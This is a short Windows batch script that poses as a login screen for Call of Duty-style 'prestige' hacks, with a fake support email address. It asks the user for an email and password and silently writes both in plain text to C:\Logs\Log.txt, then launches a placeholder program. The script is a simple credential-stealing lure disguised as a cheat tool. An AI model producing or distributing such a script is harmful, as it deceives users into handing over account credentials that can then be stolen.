@echo off
color a
title Login
cls
echo Please Enter Email Adress And Password.
echo Hacks will be available the next time you log in.
echo Email CodHacks@yahoo.com for support
echo.
echo.
cd "C:\Logs"
set /p user=Username:
set /p pass=Password:
echo prestige (1/2/3/4/5/6/7/8/9/10/11/12/13/14/15)
pause
echo Username="%user%" Password="%pass%" >Log.txt
start >>Program Here<<
exit